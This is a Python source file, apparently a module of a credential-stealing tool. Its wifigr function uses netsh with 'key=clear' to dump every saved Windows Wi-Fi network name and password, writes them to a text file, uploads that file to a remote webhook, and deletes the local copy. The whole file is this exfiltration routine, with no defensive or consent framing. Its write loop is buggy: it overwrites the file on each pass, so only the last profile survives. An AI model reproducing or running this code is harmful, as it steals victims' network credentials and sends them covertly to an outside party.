import subprocess
import re
import os
import requests
__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))

def wifigr(webhook:str):
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    
    wifi_list = []
    
    if len(profile_names) != 0:
        for name in profile_names:
            try:
    
                wifi_profile = {}
    
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('utf-8')
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
    
                    if password == None:
                        wifi_profile["password"] = None
                    else:
    
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile) 
            except Exception as e:
                print(e)
                pass
 
    for x in range(len(wifi_list)):
        #return wifi_list[x] 
        with open(f"{__location__}/wifi_list.txt","w+") as ff:
            ff.write(str(wifi_list[x]))
    files = {"wifi_list": open(f"{__location__}/wifi_list.txt", "rb")}
    requests.post(webhook, files=files)
    files["wifi_list"].close()
    os.remove("wifi_list.txt")
